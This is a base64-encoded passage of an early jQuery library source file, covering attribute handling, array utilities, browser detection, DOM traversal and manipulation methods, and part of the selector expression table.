pOwoKCQkJZWxzZQoJCQkJcmV0ID0galF1ZXJ5Lm1lcmdlKCByZXQsIGVsZW0gKTsKCgkJfSk7CgoJCXJldHVybiByZXQ7Cgl9LAoJCglhdHRyOiBmdW5jdGlvbiggZWxlbSwgbmFtZSwgdmFsdWUgKSB7CgkJLy8gZG9uJ3Qgc2V0IGF0dHJpYnV0ZXMgb24gdGV4dCBhbmQgY29tbWVudCBub2RlcwoJCWlmICghZWxlbSB8fCBlbGVtLm5vZGVUeXBlID09IDMgfHwgZWxlbS5ub2RlVHlwZSA9PSA4KQoJCQlyZXR1cm4gdW5kZWZpbmVkOwoKCQl2YXIgZml4ID0galF1ZXJ5LmlzWE1MRG9jKCBlbGVtICkgPwoJCQl7fSA6CgkJCWpRdWVyeS5wcm9wczsKCgkJLy8gU2FmYXJpIG1pcy1yZXBvcnRzIHRoZSBkZWZhdWx0IHNlbGVjdGVkIHByb3BlcnR5IG9mIGEgaGlkZGVuIG9wdGlvbgoJCS8vIEFjY2Vzc2luZyB0aGUgcGFyZW50J3Mgc2VsZWN0ZWRJbmRleCBwcm9wZXJ0eSBmaXhlcyBpdAoJCWlmICggbmFtZSA9PSAic2VsZWN0ZWQiICYmIGpRdWVyeS5icm93c2VyLnNhZmFyaSApCgkJCWVsZW0ucGFyZW50Tm9kZS5zZWxlY3RlZEluZGV4OwoJCQoJCS8vIENlcnRhaW4gYXR0cmlidXRlcyBvbmx5IHdvcmsgd2hlbiBhY2Nlc3NlZCB2aWEgdGhlIG9sZCBET00gMCB3YXkKCQlpZiAoIGZpeFsgbmFtZSBdICkgewoJCQlpZiAoIHZhbHVlICE9IHVuZGVmaW5lZCApCgkJCQllbGVtWyBmaXhbIG5hbWUgXSBdID0gdmFsdWU7CgoJCQlyZXR1cm4gZWxlbVsgZml4WyBuYW1lIF0gXTsKCgkJfSBlbHNlIGlmICggalF1ZXJ5LmJyb3dzZXIubXNpZSAmJiBuYW1lID09ICJzdHlsZSIgKQoJCQlyZXR1cm4galF1ZXJ5LmF0dHIoIGVsZW0uc3R5bGUsICJjc3NUZXh0IiwgdmFsdWUgKTsKCgkJZWxzZSBpZiAoIHZhbHVlID09IHVuZGVmaW5lZCAmJiBqUXVlcnkuYnJvd3Nlci5tc2llICYmIGpRdWVyeS5ub2RlTmFtZSggZWxlbSwgImZvcm0iICkgJiYgKG5hbWUgPT0gImFjdGlvbiIgfHwgbmFtZSA9PSAibWV0aG9kIikgKQoJCQlyZXR1cm4gZWxlbS5nZXRBdHRyaWJ1dGVOb2RlKCBuYW1lICkubm9kZVZhbHVlOwoKCQkvLyBJRSBlbGVtLmdldEF0dHJpYnV0ZSBwYXNzZXMgZXZlbiBmb3Igc3R5bGUKCQllbHNlIGlmICggZWxlbS50YWdOYW1lICkgewoKCQkJaWYgKCB2YWx1ZSAhPSB1bmRlZmluZWQgKSB7CgkJCQkvLyBXZSBjYW4ndCBhbGxvdyB0aGUgdHlwZSBwcm9wZXJ0eSB0byBiZSBjaGFuZ2VkIChzaW5jZSBpdCBjYXVzZXMgcHJvYmxlbXMgaW4gSUUpCgkJCQlpZiAoIG5hbWUgPT0gInR5cGUiICYmIGpRdWVyeS5ub2RlTmFtZSggZWxlbSwgImlucHV0IiApICYmIGVsZW0ucGFyZW50Tm9kZSApCgkJCQkJdGhyb3cgInR5cGUgcHJvcGVydHkgY2FuJ3QgYmUgY2hhbmdlZCI7CgoJCQkJLy8gY29udmVydCB0aGUgdmFsdWUgdG8gYSBzdHJpbmcgKGFsbCBicm93c2VycyBkbyB0aGlzIGJ1dCBJRSkgc2VlICMxMDcwCgkJCQllbGVtLnNldEF0dHJpYnV0ZSggbmFtZSwgIiIgKyB2YWx1ZSApOwoJCQl9CgoJCQlpZiAoIGpRdWVyeS5icm93c2VyLm1zaWUgJiYgL2hyZWZ8c3JjLy50ZXN0KCBuYW1lICkgJiYgIWpRdWVyeS5pc1hNTERvYyggZWxlbSApICkgCgkJCQlyZXR1cm4gZWxlbS5nZXRBdHRyaWJ1dGUoIG5hbWUsIDIgKTsKCgkJCXJldHVybiBlbGVtLmdldEF0dHJpYnV0ZSggbmFtZSApOwoKCQkvLyBlbGVtIGlzIGFjdHVhbGx5IGVsZW0uc3R5bGUgLi4uIHNldCB0aGUgc3R5bGUKCQl9IGVsc2UgewoJCQkvLyBJRSBhY3R1YWxseSB1c2VzIGZpbHRlcnMgZm9yIG9wYWNpdHkKCQkJaWYgKCBuYW1lID09ICJvcGFjaXR5IiAmJiBqUXVlcnkuYnJvd3Nlci5tc2llICkgewoJCQkJaWYgKCB2YWx1ZSAhPSB1bmRlZmluZWQgKSB7CgkJCQkJLy8gSUUgaGFzIHRyb3VibGUgd2l0aCBvcGFjaXR5IGlmIGl0IGRvZXMgbm90IGhhdmUgbGF5b3V0CgkJCQkJLy8gRm9yY2UgaXQgYnkgc2V0dGluZyB0aGUgem9vbSBsZXZlbAoJCQkJCWVsZW0uem9vbSA9IDE7IAoJCgkJCQkJLy8gU2V0IHRoZSBhbHBoYSBmaWx0ZXIgdG8gc2V0IHRoZSBvcGFjaXR5CgkJCQkJZWxlbS5maWx0ZXIgPSAoZWxlbS5maWx0ZXIgfHwgIiIpLnJlcGxhY2UoIC9hbHBoYVwoW14pXSpcKS8sICIiICkgKwoJCQkJCQkocGFyc2VGbG9hdCggdmFsdWUgKS50b1N0cmluZygpID09ICJOYU4iID8gIiIgOiAiYWxwaGEob3BhY2l0eT0iICsgdmFsdWUgKiAxMDAgKyAiKSIpOwoJCQkJfQoJCgkJCQlyZXR1cm4gZWxlbS5maWx0ZXIgJiYgZWxlbS5maWx0ZXIuaW5kZXhPZigib3BhY2l0eT0iKSA+PSAwID8KCQkJCQkocGFyc2VGbG9hdCggZWxlbS5maWx0ZXIubWF0Y2goL29wYWNpdHk9KFteKV0qKS8pWzFdICkgLyAxMDApLnRvU3RyaW5nKCkgOgoJCQkJCSIiOwoJCQl9CgoJCQluYW1lID0gbmFtZS5yZXBsYWNlKC8tKFthLXpdKS9pZywgZnVuY3Rpb24oYWxsLCBsZXR0ZXIpewoJCQkJcmV0dXJuIGxldHRlci50b1VwcGVyQ2FzZSgpOwoJCQl9KTsKCgkJCWlmICggdmFsdWUgIT0gdW5kZWZpbmVkICkKCQkJCWVsZW1bIG5hbWUgXSA9IHZhbHVlOwoKCQkJcmV0dXJuIGVsZW1bIG5hbWUgXTsKCQl9Cgl9LAoJCgl0cmltOiBmdW5jdGlvbiggdGV4dCApIHsKCQlyZXR1cm4gKHRleHQgfHwgIiIpLnJlcGxhY2UoIC9eXHMrfFxzKyQvZywgIiIgKTsKCX0sCgoJbWFrZUFycmF5OiBmdW5jdGlvbiggYXJyYXkgKSB7CgkJdmFyIHJldCA9IFtdOwoKCQkvLyBOZWVkIHRvIHVzZSB0eXBlb2YgdG8gZmlnaHQgU2FmYXJpIGNoaWxkTm9kZXMgY3Jhc2hlcwoJCWlmICggdHlwZW9mIGFycmF5ICE9ICJhcnJheSIgKQoJCQlmb3IgKCB2YXIgaSA9IDAsIGxlbmd0aCA9IGFycmF5Lmxlbmd0aDsgaSA8IGxlbmd0aDsgaSsrICkKCQkJCXJldC5wdXNoKCBhcnJheVsgaSBdICk7CgkJZWxzZQoJCQlyZXQgPSBhcnJheS5zbGljZSggMCApOwoKCQlyZXR1cm4gcmV0OwoJfSwKCglpbkFycmF5OiBmdW5jdGlvbiggZWxlbSwgYXJyYXkgKSB7CgkJZm9yICggdmFyIGkgPSAwLCBsZW5ndGggPSBhcnJheS5sZW5ndGg7IGkgPCBsZW5ndGg7IGkrKyApCgkJCWlmICggYXJyYXlbIGkgXSA9PSBlbGVtICkKCQkJCXJldHVybiBpOwoKCQlyZXR1cm4gLTE7Cgl9LAoKCW1lcmdlOiBmdW5jdGlvbiggZmlyc3QsIHNlY29uZCApIHsKCQkvLyBXZSBoYXZlIHRvIGxvb3AgdGhpcyB3YXkgYmVjYXVzZSBJRSAmIE9wZXJhIG92ZXJ3cml0ZSB0aGUgbGVuZ3RoCgkJLy8gZXhwYW5kbyBvZiBnZXRFbGVtZW50c0J5VGFnTmFtZQoKCQkvLyBBbHNvLCB3ZSBuZWVkIHRvIG1ha2Ugc3VyZSB0aGF0IHRoZSBjb3JyZWN0IGVsZW1lbnRzIGFyZSBiZWluZyByZXR1cm5lZAoJCS8vIChJRSByZXR1cm5zIGNvbW1lbnQgbm9kZXMgaW4gYSAnKicgcXVlcnkpCgkJaWYgKCBqUXVlcnkuYnJvd3Nlci5tc2llICkgewoJCQlmb3IgKCB2YXIgaSA9IDA7IHNlY29uZFsgaSBdOyBpKysgKQoJCQkJaWYgKCBzZWNvbmRbIGkgXS5ub2RlVHlwZSAhPSA4ICkKCQkJCQlmaXJzdC5wdXNoKCBzZWNvbmRbIGkgXSApOwoKCQl9IGVsc2UKCQkJZm9yICggdmFyIGkgPSAwOyBzZWNvbmRbIGkgXTsgaSsrICkKCQkJCWZpcnN0LnB1c2goIHNlY29uZFsgaSBdICk7CgoJCXJldHVybiBmaXJzdDsKCX0sCgoJdW5pcXVlOiBmdW5jdGlvbiggYXJyYXkgKSB7CgkJdmFyIHJldCA9IFtdLCBkb25lID0ge307CgoJCXRyeSB7CgoJCQlmb3IgKCB2YXIgaSA9IDAsIGxlbmd0aCA9IGFycmF5Lmxlbmd0aDsgaSA8IGxlbmd0aDsgaSsrICkgewoJCQkJdmFyIGlkID0galF1ZXJ5LmRhdGEoIGFycmF5WyBpIF0gKTsKCgkJCQlpZiAoICFkb25lWyBpZCBdICkgewoJCQkJCWRvbmVbIGlkIF0gPSB0cnVlOwoJCQkJCXJldC5wdXNoKCBhcnJheVsgaSBdICk7CgkJCQl9CgkJCX0KCgkJfSBjYXRjaCggZSApIHsKCQkJcmV0ID0gYXJyYXk7CgkJfQoKCQlyZXR1cm4gcmV0OwoJfSwKCglncmVwOiBmdW5jdGlvbiggZWxlbXMsIGNhbGxiYWNrLCBpbnYgKSB7CgkJdmFyIHJldCA9IFtdOwoKCQkvLyBHbyB0aHJvdWdoIHRoZSBhcnJheSwgb25seSBzYXZpbmcgdGhlIGl0ZW1zCgkJLy8gdGhhdCBwYXNzIHRoZSB2YWxpZGF0b3IgZnVuY3Rpb24KCQlmb3IgKCB2YXIgaSA9IDAsIGxlbmd0aCA9IGVsZW1zLmxlbmd0aDsgaSA8IGxlbmd0aDsgaSsrICkKCQkJaWYgKCAhaW52ICYmIGNhbGxiYWNrKCBlbGVtc1sgaSBdLCBpICkgfHwgaW52ICYmICFjYWxsYmFjayggZWxlbXNbIGkgXSwgaSApICkKCQkJCXJldC5wdXNoKCBlbGVtc1sgaSBdICk7CgoJCXJldHVybiByZXQ7Cgl9LAoKCW1hcDogZnVuY3Rpb24oIGVsZW1zLCBjYWxsYmFjayApIHsKCQl2YXIgcmV0ID0gW107CgoJCS8vIEdvIHRocm91Z2ggdGhlIGFycmF5LCB0cmFuc2xhdGluZyBlYWNoIG9mIHRoZSBpdGVtcyB0byB0aGVpcgoJCS8vIG5ldyB2YWx1ZSAob3IgdmFsdWVzKS4KCQlmb3IgKCB2YXIgaSA9IDAsIGxlbmd0aCA9IGVsZW1zLmxlbmd0aDsgaSA8IGxlbmd0aDsgaSsrICkgewoJCQl2YXIgdmFsdWUgPSBjYWxsYmFjayggZWxlbXNbIGkgXSwgaSApOwoKCQkJaWYgKCB2YWx1ZSAhPT0gbnVsbCAmJiB2YWx1ZSAhPSB1bmRlZmluZWQgKSB7CgkJCQlpZiAoIHZhbHVlLmNvbnN0cnVjdG9yICE9IEFycmF5ICkKCQkJCQl2YWx1ZSA9IFsgdmFsdWUgXTsKCgkJCQlyZXQgPSByZXQuY29uY2F0KCB2YWx1ZSApOwoJCQl9CgkJfQoKCQlyZXR1cm4gcmV0OwoJfQp9KTsKCnZhciB1c2VyQWdlbnQgPSBuYXZpZ2F0b3IudXNlckFnZW50LnRvTG93ZXJDYXNlKCk7CgovLyBGaWd1cmUgb3V0IHdoYXQgYnJvd3NlciBpcyBiZWluZyB1c2VkCmpRdWVyeS5icm93c2VyID0gewoJdmVyc2lvbjogKHVzZXJBZ2VudC5tYXRjaCggLy4rKD86cnZ8aXR8cmF8aWUpW1wvOiBdKFtcZC5dKykvICkgfHwgW10pWzFdLAoJc2FmYXJpOiAvd2Via2l0Ly50ZXN0KCB1c2VyQWdlbnQgKSwKCW9wZXJhOiAvb3BlcmEvLnRlc3QoIHVzZXJBZ2VudCApLAoJbXNpZTogL21zaWUvLnRlc3QoIHVzZXJBZ2VudCApICYmICEvb3BlcmEvLnRlc3QoIHVzZXJBZ2VudCApLAoJbW96aWxsYTogL21vemlsbGEvLnRlc3QoIHVzZXJBZ2VudCApICYmICEvKGNvbXBhdGlibGV8d2Via2l0KS8udGVzdCggdXNlckFnZW50ICkKfTsKCnZhciBzdHlsZUZsb2F0ID0galF1ZXJ5LmJyb3dzZXIubXNpZSA/Cgkic3R5bGVGbG9hdCIgOgoJImNzc0Zsb2F0IjsKCQpqUXVlcnkuZXh0ZW5kKHsKCS8vIENoZWNrIHRvIHNlZSBpZiB0aGUgVzNDIGJveCBtb2RlbCBpcyBiZWluZyB1c2VkCglib3hNb2RlbDogIWpRdWVyeS5icm93c2VyLm1zaWUgfHwgZG9jdW1lbnQuY29tcGF0TW9kZSA9PSAiQ1NTMUNvbXBhdCIsCgkKCXByb3BzOiB7CgkJImZvciI6ICJodG1sRm9yIiwKCQkiY2xhc3MiOiAiY2xhc3NOYW1lIiwKCQkiZmxvYXQiOiBzdHlsZUZsb2F0LAoJCWNzc0Zsb2F0OiBzdHlsZUZsb2F0LAoJCXN0eWxlRmxvYXQ6IHN0eWxlRmxvYXQsCgkJaW5uZXJIVE1MOiAiaW5uZXJIVE1MIiwKCQljbGFzc05hbWU6ICJjbGFzc05hbWUiLAoJCXZhbHVlOiAidmFsdWUiLAoJCWRpc2FibGVkOiAiZGlzYWJsZWQiLAoJCWNoZWNrZWQ6ICJjaGVja2VkIiwKCQlyZWFkb25seTogInJlYWRPbmx5IiwKCQlzZWxlY3RlZDogInNlbGVjdGVkIiwKCQltYXhsZW5ndGg6ICJtYXhMZW5ndGgiLAoJCXNlbGVjdGVkSW5kZXg6ICJzZWxlY3RlZEluZGV4IiwKCQlkZWZhdWx0VmFsdWU6ICJkZWZhdWx0VmFsdWUiLAoJCXRhZ05hbWU6ICJ0YWdOYW1lIiwKCQlub2RlTmFtZTogIm5vZGVOYW1lIgoJfQp9KTsKCmpRdWVyeS5lYWNoKHsKCXBhcmVudDogZnVuY3Rpb24oZWxlbSl7cmV0dXJuIGVsZW0ucGFyZW50Tm9kZTt9LAoJcGFyZW50czogZnVuY3Rpb24oZWxlbSl7cmV0dXJuIGpRdWVyeS5kaXIoZWxlbSwicGFyZW50Tm9kZSIpO30sCgluZXh0OiBmdW5jdGlvbihlbGVtKXtyZXR1cm4galF1ZXJ5Lm50aChlbGVtLDIsIm5leHRTaWJsaW5nIik7fSwKCXByZXY6IGZ1bmN0aW9uKGVsZW0pe3JldHVybiBqUXVlcnkubnRoKGVsZW0sMiwicHJldmlvdXNTaWJsaW5nIik7fSwKCW5leHRBbGw6IGZ1bmN0aW9uKGVsZW0pe3JldHVybiBqUXVlcnkuZGlyKGVsZW0sIm5leHRTaWJsaW5nIik7fSwKCXByZXZBbGw6IGZ1bmN0aW9uKGVsZW0pe3JldHVybiBqUXVlcnkuZGlyKGVsZW0sInByZXZpb3VzU2libGluZyIpO30sCglzaWJsaW5nczogZnVuY3Rpb24oZWxlbSl7cmV0dXJuIGpRdWVyeS5zaWJsaW5nKGVsZW0ucGFyZW50Tm9kZS5maXJzdENoaWxkLGVsZW0pO30sCgljaGlsZHJlbjogZnVuY3Rpb24oZWxlbSl7cmV0dXJuIGpRdWVyeS5zaWJsaW5nKGVsZW0uZmlyc3RDaGlsZCk7fSwKCWNvbnRlbnRzOiBmdW5jdGlvbihlbGVtKXtyZXR1cm4galF1ZXJ5Lm5vZGVOYW1lKGVsZW0sImlmcmFtZSIpP2VsZW0uY29udGVudERvY3VtZW50fHxlbGVtLmNvbnRlbnRXaW5kb3cuZG9jdW1lbnQ6alF1ZXJ5Lm1ha2VBcnJheShlbGVtLmNoaWxkTm9kZXMpO30KfSwgZnVuY3Rpb24obmFtZSwgZm4pewoJalF1ZXJ5LmZuWyBuYW1lIF0gPSBmdW5jdGlvbiggc2VsZWN0b3IgKSB7CgkJdmFyIHJldCA9IGpRdWVyeS5tYXAoIHRoaXMsIGZuICk7CgoJCWlmICggc2VsZWN0b3IgJiYgdHlwZW9mIHNlbGVjdG9yID09ICJzdHJpbmciICkKCQkJcmV0ID0galF1ZXJ5Lm11bHRpRmlsdGVyKCBzZWxlY3RvciwgcmV0ICk7CgoJCXJldHVybiB0aGlzLnB1c2hTdGFjayggalF1ZXJ5LnVuaXF1ZSggcmV0ICkgKTsKCX07Cn0pOwoKalF1ZXJ5LmVhY2goewoJYXBwZW5kVG86ICJhcHBlbmQiLAoJcHJlcGVuZFRvOiAicHJlcGVuZCIsCglpbnNlcnRCZWZvcmU6ICJiZWZvcmUiLAoJaW5zZXJ0QWZ0ZXI6ICJhZnRlciIsCglyZXBsYWNlQWxsOiAicmVwbGFjZVdpdGgiCn0sIGZ1bmN0aW9uKG5hbWUsIG9yaWdpbmFsKXsKCWpRdWVyeS5mblsgbmFtZSBdID0gZnVuY3Rpb24oKSB7CgkJdmFyIGFyZ3MgPSBhcmd1bWVudHM7CgoJCXJldHVybiB0aGlzLmVhY2goZnVuY3Rpb24oKXsKCQkJZm9yICggdmFyIGkgPSAwLCBsZW5ndGggPSBhcmdzLmxlbmd0aDsgaSA8IGxlbmd0aDsgaSsrICkKCQkJCWpRdWVyeSggYXJnc1sgaSBdIClbIG9yaWdpbmFsIF0oIHRoaXMgKTsKCQl9KTsKCX07Cn0pOwoKalF1ZXJ5LmVhY2goewoJcmVtb3ZlQXR0cjogZnVuY3Rpb24oIG5hbWUgKSB7CgkJalF1ZXJ5LmF0dHIoIHRoaXMsIG5hbWUsICIiICk7CgkJaWYgKHRoaXMubm9kZVR5cGUgPT0gMSkgCgkJCXRoaXMucmVtb3ZlQXR0cmlidXRlKCBuYW1lICk7Cgl9LAoKCWFkZENsYXNzOiBmdW5jdGlvbiggY2xhc3NOYW1lcyApIHsKCQlqUXVlcnkuY2xhc3NOYW1lLmFkZCggdGhpcywgY2xhc3NOYW1lcyApOwoJfSwKCglyZW1vdmVDbGFzczogZnVuY3Rpb24oIGNsYXNzTmFtZXMgKSB7CgkJalF1ZXJ5LmNsYXNzTmFtZS5yZW1vdmUoIHRoaXMsIGNsYXNzTmFtZXMgKTsKCX0sCgoJdG9nZ2xlQ2xhc3M6IGZ1bmN0aW9uKCBjbGFzc05hbWVzICkgewoJCWpRdWVyeS5jbGFzc05hbWVbIGpRdWVyeS5jbGFzc05hbWUuaGFzKCB0aGlzLCBjbGFzc05hbWVzICkgPyAicmVtb3ZlIiA6ICJhZGQiIF0oIHRoaXMsIGNsYXNzTmFtZXMgKTsKCX0sCgoJcmVtb3ZlOiBmdW5jdGlvbiggc2VsZWN0b3IgKSB7CgkJaWYgKCAhc2VsZWN0b3IgfHwgalF1ZXJ5LmZpbHRlciggc2VsZWN0b3IsIFsgdGhpcyBdICkuci5sZW5ndGggKSB7CgkJCS8vIFByZXZlbnQgbWVtb3J5IGxlYWtzCgkJCWpRdWVyeSggIioiLCB0aGlzICkuYWRkKHRoaXMpLmVhY2goZnVuY3Rpb24oKXsKCQkJCWpRdWVyeS5ldmVudC5yZW1vdmUodGhpcyk7CgkJCQlqUXVlcnkucmVtb3ZlRGF0YSh0aGlzKTsKCQkJfSk7CgkJCWlmICh0aGlzLnBhcmVudE5vZGUpCgkJCQl0aGlzLnBhcmVudE5vZGUucmVtb3ZlQ2hpbGQoIHRoaXMgKTsKCQl9Cgl9LAoKCWVtcHR5OiBmdW5jdGlvbigpIHsKCQkvLyBSZW1vdmUgZWxlbWVudCBub2RlcyBhbmQgcHJldmVudCBtZW1vcnkgbGVha3MKCQlqUXVlcnkoICI+KiIsIHRoaXMgKS5yZW1vdmUoKTsKCQkKCQkvLyBSZW1vdmUgYW55IHJlbWFpbmluZyBub2RlcwoJCXdoaWxlICggdGhpcy5maXJzdENoaWxkICkKCQkJdGhpcy5yZW1vdmVDaGlsZCggdGhpcy5maXJzdENoaWxkICk7Cgl9Cn0sIGZ1bmN0aW9uKG5hbWUsIGZuKXsKCWpRdWVyeS5mblsgbmFtZSBdID0gZnVuY3Rpb24oKXsKCQlyZXR1cm4gdGhpcy5lYWNoKCBmbiwgYXJndW1lbnRzICk7Cgl9Owp9KTsKCmpRdWVyeS5lYWNoKFsgIkhlaWdodCIsICJXaWR0aCIgXSwgZnVuY3Rpb24oaSwgbmFtZSl7Cgl2YXIgdHlwZSA9IG5hbWUudG9Mb3dlckNhc2UoKTsKCQoJalF1ZXJ5LmZuWyB0eXBlIF0gPSBmdW5jdGlvbiggc2l6ZSApIHsKCQkvLyBHZXQgd2luZG93IHdpZHRoIG9yIGhlaWdodAoJCXJldHVybiB0aGlzWzBdID09IHdpbmRvdyA/CgkJCS8vIE9wZXJhIHJlcG9ydHMgZG9jdW1lbnQuYm9keS5jbGllbnRbV2lkdGgvSGVpZ2h0XSBwcm9wZXJseSBpbiBib3RoIHF1aXJrcyBhbmQgc3RhbmRhcmRzCgkJCWpRdWVyeS5icm93c2VyLm9wZXJhICYmIGRvY3VtZW50LmJvZHlbICJjbGllbnQiICsgbmFtZSBdIHx8IAoJCQkKCQkJLy8gU2FmYXJpIHJlcG9ydHMgaW5uZXJbV2lkdGgvSGVpZ2h0XSBqdXN0IGZpbmUgKE1vemlsbGEgYW5kIE9wZXJhIGluY2x1ZGUgc2Nyb2xsIGJhciB3aWR0aHMpCgkJCWpRdWVyeS5icm93c2VyLnNhZmFyaSAmJiB3aW5kb3dbICJpbm5lciIgKyBuYW1lIF0gfHwKCQkJCgkJCS8vIEV2ZXJ5b25lIGVsc2UgdXNlIGRvY3VtZW50LmRvY3VtZW50RWxlbWVudCBvciBkb2N1bWVudC5ib2R5IGRlcGVuZGluZyBvbiBRdWlya3MgdnMgU3RhbmRhcmRzIG1vZGUKCQkJZG9jdW1lbnQuY29tcGF0TW9kZSA9PSAiQ1NTMUNvbXBhdCIgJiYgZG9jdW1lbnQuZG9jdW1lbnRFbGVtZW50WyAiY2xpZW50IiArIG5hbWUgXSB8fCBkb2N1bWVudC5ib2R5WyAiY2xpZW50IiArIG5hbWUgXSA6CgkJCgkJCS8vIEdldCBkb2N1bWVudCB3aWR0aCBvciBoZWlnaHQKCQkJdGhpc1swXSA9PSBkb2N1bWVudCA/CgkJCQkvLyBFaXRoZXIgc2Nyb2xsW1dpZHRoL0hlaWdodF0gb3Igb2Zmc2V0W1dpZHRoL0hlaWdodF0sIHdoaWNoZXZlciBpcyBncmVhdGVyCgkJCQlNYXRoLm1heCggCgkJCQkJTWF0aC5tYXgoZG9jdW1lbnQuYm9keVsic2Nyb2xsIiArIG5hbWVdLCBkb2N1bWVudC5kb2N1bWVudEVsZW1lbnRbInNjcm9sbCIgKyBuYW1lXSksIAoJCQkJCU1hdGgubWF4KGRvY3VtZW50LmJvZHlbIm9mZnNldCIgKyBuYW1lXSwgZG9jdW1lbnQuZG9jdW1lbnRFbGVtZW50WyJvZmZzZXQiICsgbmFtZV0pIAoJCQkJKSA6CgoJCQkJLy8gR2V0IG9yIHNldCB3aWR0aCBvciBoZWlnaHQgb24gdGhlIGVsZW1lbnQKCQkJCXNpemUgPT0gdW5kZWZpbmVkID8KCQkJCQkvLyBHZXQgd2lkdGggb3IgaGVpZ2h0IG9uIHRoZSBlbGVtZW50CgkJCQkJKHRoaXMubGVuZ3RoID8galF1ZXJ5LmNzcyggdGhpc1swXSwgdHlwZSApIDogbnVsbCkgOgoKCQkJCQkvLyBTZXQgdGhlIHdpZHRoIG9yIGhlaWdodCBvbiB0aGUgZWxlbWVudCAoZGVmYXVsdCB0byBwaXhlbHMgaWYgdmFsdWUgaXMgdW5pdGxlc3MpCgkJCQkJdGhpcy5jc3MoIHR5cGUsIHNpemUuY29uc3RydWN0b3IgPT0gU3RyaW5nID8gc2l6ZSA6IHNpemUgKyAicHgiICk7Cgl9Owp9KTsKCnZhciBjaGFycyA9IGpRdWVyeS5icm93c2VyLnNhZmFyaSAmJiBwYXJzZUludChqUXVlcnkuYnJvd3Nlci52ZXJzaW9uKSA8IDQxNyA/CgkJIig/OltcXHcqXy1dfFxcXFwuKSIgOgoJCSIoPzpbXFx3XHUwMTI4LVx1RkZGRipfLV18XFxcXC4pIiwKCXF1aWNrQ2hpbGQgPSBuZXcgUmVnRXhwKCJePlxccyooIiArIGNoYXJzICsgIispIiksCglxdWlja0lEID0gbmV3IFJlZ0V4cCgiXigiICsgY2hhcnMgKyAiKykoIykoIiArIGNoYXJzICsgIispIiksCglxdWlja0NsYXNzID0gbmV3IFJlZ0V4cCgiXihbIy5dPykoIiArIGNoYXJzICsgIiopIik7CgpqUXVlcnkuZXh0ZW5kKHsKCWV4cHI6IHsKCQkiIjogZnVuY3Rpb24oYSxpLG0pe3JldHVybiBtWzJdPT0iKiJ8fGpRdWVyeS5ub2RlTmFtZShhLG1bMl0pO30sCgkJIiMiOiBmdW5jdGlvbihhLGksbSl7cmV0dXJuIGEuZ2V0QXR0cmlidXRlKCJpZCIpPT1tWzJdO30sCgkJIjoiOiB7CgkJCS8vIFBvc2l0aW9uIENoZWNrcwoJCQlsdDogZnVuY3Rpb24oYSxpLG0pe3JldHVybiBpPG1bM10tMDt9LAoJCQlndDogZnVuY3Rpb24oYSxpLG0pe3JldHVybiBpPm1bM10tMDt9LAoJCQludGg6IGZ1bmN0aW9uKGEsaSxtKXtyZXR1cm4gbVszXS0wPT1pO30sCgkJCWVxOiBmdW5jdGlvbihhLGksbSl7cmV0dXJuIG1bM10tMD09aTt9LAoJCQlmaXJzdDogZnVuY3Rpb24oYSxpKXtyZXR1cm4gaT09MDt9LAoJCQlsYXN0OiBmdW5jdGlvbihhLGksbSxyKXtyZXR1cm4gaT09ci5sZW5ndGgtMTt9LAoJCQlldmVuOiBmdW5jdGlvbihhLGkpe3JldHVybiBpJTI9PTA7fSwKCQkJb2RkOiBmdW5jdGlvbihhLGkpe3JldHVybiBpJTI7fSwKCgkJCS8vIENoaWxkIENoZWNrcwoJCQkiZmlyc3QtY2hpbGQiOiBmdW5jdGlvbihhKXtyZXR1cm4gYS5wYXJlbnROb2RlLmdldEVsZW1lbnRzQnlUYWdOYW1lKCIqIilbMF09PWE7fSwKCQkJImxhc3QtY2hpbGQiOiBmdW5jdGlvbihhKXtyZXR1cm4galF1ZXJ5Lm50aChhLnBhcmVudE5vZGUubGFzdENoaWxkLDEsInByZXZpb3VzU2libGluZyIpPT1hO30sCgkJCSJvbmx5LWNoaWxkIjogZnVuY3Rpb24oYSl7cmV0dXJuICFqUXVlcnkubnRoKGEucGFyZW50Tm9kZS5sYXN0Q2hpbGQsMiwicHJldmlvdXNTaWJsaW5nIik7fSwKCgkJCS8vIFBhcmVudCBDaGVja3MKCQkJcGFyZW50OiBmdW5jdGlvbihhKXtyZXR1cm4gYS5maXJzdENoaWxkO30sCgkJCWVtcHR5OiBmdW5jdGlvbihhKXtyZXR1cm4gIWEuZmlyc3RDaGlsZDt9LAoKCQkJLy8gVGV4dCBDaGVjawoJCQljb250YWluczogZnVuY3Rpb24oYSxpLG0pe3JldHVybiAoYS50ZXh0Q29udGVudHx8YS5pbm5lclRleHR8fGpRdWVyeShhKS50ZXh0KCl8fCIiKS5pbmRleE9mKG1bM10pPj0wO30sCgoJCQkvLyBWaXNpYmlsaXR5CgkJCXZpc2libGU6IGZ1bmN0aW9uKGEpe3JldHVybiAiaGlkZGVuIiE9YS50eXBlJiZqUXVlcnkuY3NzKGEsImRpc3BsYXkiKSE9Im5vbmUiJiZqUXVlcnkuY3NzKGEsInZpc2liaWxpdHkiKSE9ImhpZGRlbiI7fSwKCQkJaGlkZGVuOiBmdW5jdGlvbihhKXtyZXR1cm4gImhpZGRlbiI9PWEudHlwZXx8alF1ZXJ5LmNzcyhhLCJkaXNwbGF5Iik9PSJub25lInx8alF1ZXJ5LmNzcyhhLCJ2aXNpYmlsaXR5Iik9PSJoaWRkZW4iO30sCgoJCQkvLyBGb3JtIGF0dHJpYnV0ZXMKCQkJZW5hYmxlZDogZnVuY3Rpb24oYSl7cmV0dXJuICFhLmRpc2FibGVkO30sCgkJCWRpc2FibGVkOiBmdW5jdGlvbihhKXtyZXR1cm4gYS5kaXNhYmxlZDt9LAoJCQljaGVja2VkOiBmdW5jdGlvbihhKXtyZXR1cm4gYS5jaGVja2VkO30sCgkJCXNlbGVjdGVkOiBmdW5jdGlvbihhKXtyZXR1cm4gYS5zZWxlY3RlZHx8alF1ZXJ5LmF0dHIoYSwic2VsZWN0ZWQiKTt9LAoKCQkJLy8gRm9ybSBlbGVtZW50cwoJCQl0ZXh0OiBmdW5jdGlvbihhKXtyZXR1cm4gInRleHQiPT1hLnR5cGU7fSwKCQkJcmFkaW86IGZ1bmN0aW9uKGEpe3JldHVybiAicmFkaW8iPT1hLnR5cGU7fSwKCQkJY2hlY2tib3g6IGZ1bmN0aW9uKGEpe3JldHVybiAiY2hlY2tib3giPT1hLnR5cGU7fSwKCQkJZmlsZTogZnVuY3Rpb24oYSl7cmV0dXJuICJmaWxlIj09YS50eXBlO30sCgkJCXBhc3N3b3JkOiBmdW5jdGlvbihhKXtyZXR1cm4gInBhc3N3b3JkIj09YS50eXBlO30sCgkJCXN1Ym1pdDogZnVuY3Rpb24oYSl7cmV0dXJuICJzdWJtaXQiPT1hLnR5cGU7fSwKC